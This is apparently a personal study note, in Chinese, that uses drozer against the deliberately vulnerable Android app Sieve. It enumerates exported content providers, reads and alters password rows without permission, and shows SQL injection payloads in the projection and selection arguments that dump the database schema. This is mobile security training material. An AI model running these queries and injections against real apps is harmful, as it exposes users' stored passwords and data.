<!doctype html><html lang=en-us dir=ltr><head><meta charset=UTF-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content='
  Test Sieve - content providers exported - DB Based
  #

如果想知道實際的狀況和content URI是什麼，可以參考ChatGPT的說明

起手式
從以下command的結果可以知道com.mwr.example.sieve.DBContentProvider和com.mwr.example.sieve.FileBackupProvider的狀況，並且從結果可以知道URI的形式長怎樣
content://com.mwr.example.sieve.DBContentProvider/Keys/
content://com.mwr.example.sieve.DBContentProvider/Passwords/
content://com.mwr.example.sieve.DBContentProvider/Passwords
:::spoiler
dz> run app.provider.info -a com.mwr.example.sieve
Attempting to run shell module
Package: com.mwr.example.sieve
  Authority: com.mwr.example.sieve.DBContentProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.DBContentProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
    Uri Permission Patterns:
    Path Permissions:
      Path: /Keys
        Type: PATTERN_LITERAL
        Read Permission: com.mwr.example.sieve.READ_KEYS
        Write Permission: com.mwr.example.sieve.WRITE_KEYS
  Authority: com.mwr.example.sieve.FileBackupProvider
    Read Permission: null
    Write Permission: null
    Content Provider: com.mwr.example.sieve.FileBackupProvider
    Multiprocess Allowed: True
    Grant Uri Permissions: False
    Uri Permission Patterns:
    Path Permissions:

dz> run scanner.provider.finduris -a com.mwr.example.sieve
Attempting to run shell module
Scanning com.mwr.example.sieve...
No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/Keys
No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/
No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider
No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider
No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider/
Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Keys/
Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords/
Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords

For sure accessible content URIs:
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords/
  content://com.mwr.example.sieve.DBContentProvider/Passwords
:::
逆向
實際去看DBContentProvider這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情
@Override // android.content.ContentProvider
public boolean onCreate() {
    this.pwdb = new PWDBHelper(getContext());
    this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", PWTable.TABLE_NAME, 100);
    this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", "Keys", KEY);
    return false;
}
再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)
query/insert/update/delete/sqli

query
#Simple Query
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
Attempting to run shell module
     _id  1
 service
username
password  b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded)
   email  bernie6401@gmail.com

insert
根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了
dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id 2 --string password bbb --string email aaa@bbb.com
Attempting to run shell module
Done.

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
Attempting to run shell module
     _id  1
 service
username
password  b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded)
   email  bernie6401@gmail.com

     _id  2
 service  null
username  null
password  bbb
   email  aaa@bbb.com

update
_id=2的data，被我們改掉了
dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 --string password ccc --string email ddd@eee.com
Attempting to run shell module
Done.

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
Attempting to run shell module
     _id  1
 service
username
password  b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded)
   email  bernie6401@gmail.com

     _id  2
 service  null
username  null
password  ccc
   email  ddd@eee.com

delete
只剩下最一開始我們設定的data
dz> run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2
Attempting to run shell module
Done.

dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
Attempting to run shell module
     _id  1
 service
username
password  b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded)
   email  bernie6401@gmail.com

sqli
如下結果所示，的確存在sqli，並且可以得到完整的table
# 先嘗試丟一些trash byte
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "&#39;"
Attempting to run shell module
Exception occured: unrecognized token: "&#39;)" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM Passwords WHERE (&#39;)
dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "* FROM SQLITE_MASTER WHERE type=&#39;table&#39;;--"
Attempting to run shell module
| type  | name             | tbl_name         | rootpage | sql                                                                                              |
| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |
| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
我們也可以用drozer自動幫我們找
dz> run scanner.provider.injection -a com.mwr.example.sieve
Attempting to run shell module
Scanning com.mwr.example.sieve...
Not Vulnerable:
  content://com.mwr.example.sieve.DBContentProvider
  content://com.mwr.example.sieve.FileBackupProvider
  content://com.mwr.example.sieve.DBContentProvider/Keys
  content://com.mwr.example.sieve.DBContentProvider/
  content://com.mwr.example.sieve.FileBackupProvider/

Injection in Projection:
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords/

Injection in Selection:
  content://com.mwr.example.sieve.DBContentProvider/Passwords
  content://com.mwr.example.sieve.DBContentProvider/Keys/
  content://com.mwr.example.sieve.DBContentProvider/Passwords/

dz> run scanner.provider.sqltables -a com.mwr.example.sieve
Attempting to run shell module
Scanning com.mwr.example.sieve...
Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
  android_metadata
  Passwords
  Key

Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Keys/:
  android_metadata
  Passwords
  Key

Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords/:
  android_metadata
  Passwords
  Key



'><meta name=theme-color media="(prefers-color-scheme: light)" content="#ffffff"><meta name=theme-color media="(prefers-color-scheme: dark)" content="#343a40"><meta name=color-scheme content="light dark"><meta property="og:url" content="https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/"><meta property="og:site_name" content="SBK Hugo Site"><meta property="og:title" content="Test Sieve - content providers exported - DB Based"><meta property="og:description" content='Test Sieve - content providers exported - DB Based # 如果想知道實際的狀況和content URI是什麼，可以參考ChatGPT的說明
起手式 從以下command的結果可以知道com.mwr.example.sieve.DBContentProvider和com.mwr.example.sieve.FileBackupProvider的狀況，並且從結果可以知道URI的形式長怎樣 content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords :::spoiler dz> run app.provider.info -a com.mwr.example.sieve Attempting to run shell module Package: com.mwr.example.sieve Authority: com.mwr.example.sieve.DBContentProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.DBContentProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: Path: /Keys Type: PATTERN_LITERAL Read Permission: com.mwr.example.sieve.READ_KEYS Write Permission: com.mwr.example.sieve.WRITE_KEYS Authority: com.mwr.example.sieve.FileBackupProvider Read Permission: null Write Permission: null Content Provider: com.mwr.example.sieve.FileBackupProvider Multiprocess Allowed: True Grant Uri Permissions: False Uri Permission Patterns: Path Permissions: dz> run scanner.provider.finduris -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/Keys No respone from content URI: content://com.mwr.example.sieve.DBContentProvider/ No respone from content URI: content://com.mwr.example.sieve.DBContentProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider No respone from content URI: content://com.mwr.example.sieve.FileBackupProvider/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Keys/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords/ Got a response from content Uri: content://com.mwr.example.sieve.DBContentProvider/Passwords For sure accessible content URIs: content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ content://com.mwr.example.sieve.DBContentProvider/Passwords ::: 逆向 實際去看DBContentProvider這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情 @Override // android.content.ContentProvider public boolean onCreate() { this.pwdb = new PWDBHelper(getContext()); this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", PWTable.TABLE_NAME, 100); this.sUriMatcher.addURI("com.mwr.example.sieve.DBContentProvider", "Keys", KEY); return false; } 再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table) query/insert/update/delete/sqli query #Simple Query dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded) email bernie6401@gmail.com insert 根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了 dz> run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id 2 --string password bbb --string email aaa@bbb.com Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password bbb email aaa@bbb.com update _id=2的data，被我們改掉了 dz> run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 --string password ccc --string email ddd@eee.com Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded) email bernie6401@gmail.com _id 2 service null username null password ccc email ddd@eee.com delete 只剩下最一開始我們設定的data dz> run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "_id=?" --selection-args 2 Attempting to run shell module Done. dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical Attempting to run shell module _id 1 service username password b&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39; (Base64-encoded) email bernie6401@gmail.com sqli 如下結果所示，的確存在sqli，並且可以得到完整的table # 先嘗試丟一些trash byte dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection "&#39;" Attempting to run shell module Exception occured: unrecognized token: "&#39;)" (code 1 SQLITE_ERROR): , while compiling: SELECT * FROM Passwords WHERE (&#39;) dz> run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection "* FROM SQLITE_MASTER WHERE type=&#39;table&#39;;--" Attempting to run shell module | type | name | tbl_name | rootpage | sql | | table | android_metadata | android_metadata | 3 | CREATE TABLE android_metadata (locale TEXT) | | table | Passwords | Passwords | 4 | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) | | table | Key | Key | 5 | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT ) 我們也可以用drozer自動幫我們找 dz> run scanner.provider.injection -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Not Vulnerable: content://com.mwr.example.sieve.DBContentProvider content://com.mwr.example.sieve.FileBackupProvider content://com.mwr.example.sieve.DBContentProvider/Keys content://com.mwr.example.sieve.DBContentProvider/ content://com.mwr.example.sieve.FileBackupProvider/ Injection in Projection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ Injection in Selection: content://com.mwr.example.sieve.DBContentProvider/Passwords content://com.mwr.example.sieve.DBContentProvider/Keys/ content://com.mwr.example.sieve.DBContentProvider/Passwords/ dz> run scanner.provider.sqltables -a com.mwr.example.sieve Attempting to run shell module Scanning com.mwr.example.sieve... Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Keys/: android_metadata Passwords Key Accessible tables for uri content://com.mwr.example.sieve.DBContentProvider/Passwords/: android_metadata Passwords Key'><meta property="og:locale" content="en_us"><meta property="og:type" content="article"><meta property="article:section" content="tools"><meta property="article:tag" content="Android"><meta property="article:tag" content="Drozer"><title>Test Sieve - content providers exported - DB Based | SBK Hugo Site</title>
<link rel=icon href=/favicon.png><link rel=manifest href=/manifest.json><link rel=canonical href=https://bernie6401.github.io/tools/others/android-related/drozer/test-sieve/test-sieve---content-providers-exported---db-based/><link rel=stylesheet href=/book.min.6c8b9d2a1fc95075ed7da46ca81060b39add8fff6741ac51259f768929281e2c.css integrity="sha256-bIudKh/JUHXtfaRsqBBgs5rdj/9nQaxRJZ92iSkoHiw=" crossorigin=anonymous><script defer src=/fuse.min.js></script><script defer src=/en.search.min.acdc41c8d39e6c69d70d8a23779875e0a3733fefead3e428d5344966bb12f562.js integrity="sha256-rNxByNOebGnXDYojd5h14KNzP+/q0+Qo1TRJZrsS9WI=" crossorigin=anonymous></script></head><body dir=ltr><input type=checkbox class="hidden toggle" id=menu-control>
<input type=checkbox class="hidden toggle" id=toc-control><main class="container flex"><aside class=book-menu><div class=book-menu-content><nav><h2 class=book-brand><a class="flex align-center" href=/><span>SBK Hugo Site</span></a></h2><div class="book-search hidden"><input type=text id=book-search-input placeholder=Search aria-label=Search maxlength=64 data-hotkeys=s/><div class="book-search-spinner hidden"></div><ul id=book-search-results></ul></div><script>document.querySelector(".book-search").classList.remove("hidden")</script></nav><script>(function(){var e=document.querySelector("aside .book-menu-content");addEventListener("beforeunload",function(){localStorage.setItem("menu.scrollTop",e.scrollTop)}),e.scrollTop=localStorage.getItem("menu.scrollTop")})()</script></div></aside><div class=book-page><header class=book-header><div class="flex align-center justify-between"><label for=menu-control><img src=/svg/menu.svg class=book-icon alt=Menu></label><h3>Test Sieve - content providers exported - DB Based</h3><label for=toc-control><img src=/svg/toc.svg class=book-icon alt="Table of Contents"></label></div><aside class="hidden clearfix"><nav id=TableOfContents></nav></aside></header><article class="markdown book-article"><h1 id=test-sieve---content-providers-exported---db-based>Test Sieve - content providers exported - DB Based
<a class=anchor href=#test-sieve---content-providers-exported---db-based>#</a></h1><p>如果想知道實際的狀況和content URI是什麼，可以參考<a href=https://chatgpt.com/share/3a06c1d4-8117-4b27-ad02-1189b931066d>ChatGPT的說明</a></p><ol><li>起手式
從以下command的結果可以知道<code>com.mwr.example.sieve.DBContentProvider</code>和<code>com.mwr.example.sieve.FileBackupProvider</code>的狀況，並且從結果可以知道URI的形式長怎樣<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span></code></pre></div>:::spoiler<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.info -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Package: com.mwr.example.sieve
</span></span><span style=display:flex><span>  Authority: com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>    Read Permission: null
</span></span><span style=display:flex><span>    Write Permission: null
</span></span><span style=display:flex><span>    Content Provider: com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>    Multiprocess Allowed: True
</span></span><span style=display:flex><span>    Grant Uri Permissions: False
</span></span><span style=display:flex><span>    Uri Permission Patterns:
</span></span><span style=display:flex><span>    Path Permissions:
</span></span><span style=display:flex><span>      Path: /Keys
</span></span><span style=display:flex><span>        Type: PATTERN_LITERAL
</span></span><span style=display:flex><span>        Read Permission: com.mwr.example.sieve.READ_KEYS
</span></span><span style=display:flex><span>        Write Permission: com.mwr.example.sieve.WRITE_KEYS
</span></span><span style=display:flex><span>  Authority: com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>    Read Permission: null
</span></span><span style=display:flex><span>    Write Permission: null
</span></span><span style=display:flex><span>    Content Provider: com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>    Multiprocess Allowed: True
</span></span><span style=display:flex><span>    Grant Uri Permissions: False
</span></span><span style=display:flex><span>    Uri Permission Patterns:
</span></span><span style=display:flex><span>    Path Permissions:
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.finduris -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/Keys
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider/
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>No respone from content URI:      content://com.mwr.example.sieve.FileBackupProvider/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>Got a response from content Uri:  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>For sure accessible content URIs:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span></code></pre></div>:::</li><li>逆向
實際去看<code>DBContentProvider</code>這個class，會發現他把所有的query/update/delete/insert function都寫好了，不過我們可以先看初始化的時候onCreate在做的事情<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-java data-lang=java><span style=display:flex><span><span style=color:#a6e22e>@Override</span> <span style=color:#75715e>// android.content.ContentProvider</span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>public</span> <span style=color:#66d9ef>boolean</span> <span style=color:#a6e22e>onCreate</span>() {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>pwdb</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> PWDBHelper(getContext());
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sUriMatcher</span>.<span style=color:#a6e22e>addURI</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.DBContentProvider&#34;</span>, PWTable.<span style=color:#a6e22e>TABLE_NAME</span>, 100);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>this</span>.<span style=color:#a6e22e>sUriMatcher</span>.<span style=color:#a6e22e>addURI</span>(<span style=color:#e6db74>&#34;com.mwr.example.sieve.DBContentProvider&#34;</span>, <span style=color:#e6db74>&#34;Keys&#34;</span>, KEY);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#66d9ef>false</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div>再跟進去PWDBHelper，他主要就是管理 Android SQLite 資料庫的class，並進行初始化的動作，接著後續創了兩個table，包含==Passwords==和==Keys==(其實我覺得這個URI應該就類似database的table)</li><li>query/insert/update/delete/sqli<ul><li>query<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e>#Simple Query</span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span></code></pre></div></li><li>insert
根據上面的描述以及逆向的結果，我可以知道各個欄位的data type，insert的時候就是都加進去就可了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.insert content://com.mwr.example.sieve.DBContentProvider/Passwords/ --integer _id <span style=color:#ae81ff>2</span> --string password bbb --string email aaa@bbb.com
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span> service  null
</span></span><span style=display:flex><span>username  null
</span></span><span style=display:flex><span>password  bbb
</span></span><span style=display:flex><span>   email  aaa@bbb.com
</span></span></code></pre></div></li><li>update
_id=2的data，被我們改掉了<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.update content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selection-args <span style=color:#ae81ff>2</span> --string password ccc --string email ddd@eee.com
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span> service  null
</span></span><span style=display:flex><span>username  null
</span></span><span style=display:flex><span>password  ccc
</span></span><span style=display:flex><span>   email  ddd@eee.com
</span></span></code></pre></div></li><li>delete
只剩下最一開始我們設定的data<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run app.provider.delete content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span style=color:#e6db74>&#34;_id=?&#34;</span> --selection-args <span style=color:#ae81ff>2</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Done.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --vertical
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>     _id  <span style=color:#ae81ff>1</span>
</span></span><span style=display:flex><span> service
</span></span><span style=display:flex><span>username
</span></span><span style=display:flex><span>password  b<span style=color:#e6db74>&#39;Fx3af9+6ytSadEhghd3Uw6hnlsJRr7ErQ8E=&#39;</span> <span style=color:#f92672>(</span>Base64-encoded<span style=color:#f92672>)</span>
</span></span><span style=display:flex><span>   email  bernie6401@gmail.com
</span></span></code></pre></div></li><li>sqli
如下結果所示，的確存在sqli，並且可以得到完整的table<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span><span style=color:#75715e># 先嘗試丟一些trash byte</span>
</span></span><span style=display:flex><span>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords/ --selection <span style=color:#e6db74>&#34;&#39;&#34;</span>
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Exception occured: unrecognized token: <span style=color:#e6db74>&#34;&#39;)&#34;</span> <span style=color:#f92672>(</span>code <span style=color:#ae81ff>1</span> SQLITE_ERROR<span style=color:#f92672>)</span>: , <span style=color:#66d9ef>while</span> compiling: SELECT * FROM Passwords WHERE <span style=color:#f92672>(</span><span style=color:#e6db74>&#39;)
</span></span></span><span style=display:flex><span><span style=color:#e6db74>dz&gt; run app.provider.query content://com.mwr.example.sieve.DBContentProvider/Passwords --projection &#34;* FROM SQLITE_MASTER WHERE type=&#39;</span>table<span style=color:#960050;background-color:#1e0010>&#39;</span>;--<span style=color:#e6db74>&#34;
</span></span></span><span style=display:flex><span><span style=color:#e6db74>Attempting to run shell module
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| type  | name             | tbl_name         | rootpage | sql                                                                                              |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | android_metadata | android_metadata | 3        | CREATE TABLE android_metadata (locale TEXT)                                                      |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | Passwords        | Passwords        | 4        | CREATE TABLE Passwords (_id INTEGER PRIMARY KEY,service TEXT,username TEXT,password BLOB,email ) |
</span></span></span><span style=display:flex><span><span style=color:#e6db74>| table | Key              | Key              | 5        | CREATE TABLE Key (Password TEXT PRIMARY KEY,pin TEXT )
</span></span></span></code></pre></div>我們也可以用drozer自動幫我們找<div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>dz&gt; run scanner.provider.injection -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>Not Vulnerable:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.FileBackupProvider
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.FileBackupProvider/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Projection:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Injection in Selection:
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Keys/
</span></span><span style=display:flex><span>  content://com.mwr.example.sieve.DBContentProvider/Passwords/
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>dz&gt; run scanner.provider.sqltables -a com.mwr.example.sieve
</span></span><span style=display:flex><span>Attempting to run shell module
</span></span><span style=display:flex><span>Scanning com.mwr.example.sieve...
</span></span><span style=display:flex><span>Accessible tables <span style=color:#66d9ef>for</span> uri content://com.mwr.example.sieve.DBContentProvider/Passwords:
</span></span><span style=display:flex><span>  android_metadata
